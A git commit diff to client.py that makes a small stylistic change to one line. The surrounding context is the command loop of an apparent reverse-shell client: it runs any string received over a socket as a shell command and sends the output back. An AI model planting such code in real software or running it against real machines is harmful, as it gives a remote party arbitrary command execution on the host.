8654de0631168be644a5b2e54427fdb540dddd55
Alexei Godfray <58841622+AlexeiGodfray@users.noreply.github.com>
2024-08-13 09:10:04 -0700

    Cleaned up line 17 to make it more pythonic

--- client.py
+++ client.py
@@ -14,7 +14,7 @@ while True:
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
     if len(data)> 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
+        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes, "utf-8")
         s.send(str.encode(output_str + str(os.getcwd() + '> ')))
